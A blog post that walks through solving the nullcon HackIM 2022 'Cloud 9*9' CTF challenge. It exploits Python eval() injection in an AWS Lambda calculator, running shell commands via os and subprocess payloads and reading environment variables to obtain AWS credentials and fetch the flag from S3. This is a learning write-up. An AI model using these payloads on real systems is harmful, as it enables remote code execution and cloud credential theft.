---
layout: single
sitemap: true
title: "nullcon HackIM CTF 2022 - Cloud 9*9 Challenge Writeup"
categories:
  - Blog
tags:
  - CTF
  - nullcon
  - HackIM
  - cloud
  - python
  - AWS
---

[nullcon HackIM CTF](https://ctf.nullcon.net/) had cloud challenge category this year. Cloud 9*9 was one of the challenges in that category. This post describes my thought process and how I solved it.


The challenge description was as below provided with the challenge IP address.

![Cloud 9*9 challenge](/assets/postimages/4/ss0.png)

Two things I assumed from the description is that it is a serverless calculator hosted onto a cloud service provider. First thing I did was to check IP information for the provided IP address. 

[https://ipinfo.io/3.64.214.139](https://ipinfo.io/3.64.214.139) 

From above I can understand that the challenge service is hosted on AWS EU region. Now, I went to look the challenge service page. It looked like below where we can do normal calculator operations. 

![Cloud 9*9](/assets/postimages/4/ss6.png)

Next, I took this request in our very own Burp suite proxy to evaluate it further. I added "*" as input to check how server responds to special characters. Below was the response.
```JSON

HTTP/1.1 200 OK
Server: Werkzeug/2.1.2 Python/3.8.10
Date: Sun, 14 Aug 2022 07:40:55 GMT
Content-Type: application/json
Content-Length: 267
Connection: close

{"errorMessage":"unexpected EOF while parsing (<string>, line 1)","errorType":"SyntaxError","requestId":"809fbfb0-e311-41cb-971c-32ad50e71be1","stackTrace":["  File \"/var/task/lambda-function.py\", line 5, in lambda_handler\n    'result' : eval(event['input'])\n"]}
```

I can guess a few things by analysing the response from server that backend is running on Python Werkzeug. The calculation was being done by lambda-function.py file and it was using eval() function. 

After googling for some time on how to exploit eval( ) in python. I was able to figure out how to import libraries in python. 

```JSON
Request
{"input":"__import__('os').getcwd()"}

Response
{"result":"/var/task"}
```

Now, our goal is to get code execution on system to find flag on it. So I tried below payload using the python os library. 

```JSON
Request
{"input":"__import__('os').system('id')"}

Response
{"result":0}
```

Seems like code was getting executed but we cannot see the output of the command instead it returned numeric values. Turns out it was linux status code for commands. Each successful command will return zero as output. But it's of no use if we cannot get output of the commands executed. 

After searching for some more time, I found that instead of os library we can also use subprocess library to spawn shell and execute commands. 

```JSON
Request
{"input":"__import__('subprocess').getoutput('ls')"}

Response 
{"result":"lambda-function.py"}
 ```
🎉 Awesome I was able to get shell command output using subprocess. Then I cat the file and got below output. 

```JSON
{"result":"import json\n\ndef lambda_handler(event, context): \n    return { \n        'result' : eval(event['input'])\n        #flag in nullcon-s3bucket-flag4 ......\n    }"}
```

As this is a cloud challenge the flag was on a AWS S3 Storage bucket. It was required to figure how we can read that file from the S3 bucket. After some searching in AWS docs I thought as this serverless calculator function is running on AWS it should use AWS credentials every time it executes. I tried to check environment variables on the server to find anything interesting. 

![Environment variables](/assets/postimages/4/ss1.png) 
 
 We are able to get AWS credentials. So it becomes easy to get the flag from S3 Bucket using AWS CLI. I followed this S3 bucket docs to fetch the flag. 

[https://docs.aws.amazon.com/cli/latest/userguide/cli-services-s3-commands.html](https://docs.aws.amazon.com/cli/latest/userguide/cli-services-s3-commands.html) 

![AWS creds](/assets/postimages/4/ss3.png)

I was able to use AWS CLI to fetch the flag file from the S3 Bucket. 

![Flag found](/assets/postimages/4/ss4.png)

Thanks to [ENOFLAG](https://enoflag.de) for organising this CTF and special thanks to [Sec-consult](https://sec-consult.com/) team for creating cloud challenges for the CTF 🙂

Happy Hacking until next time !!! 
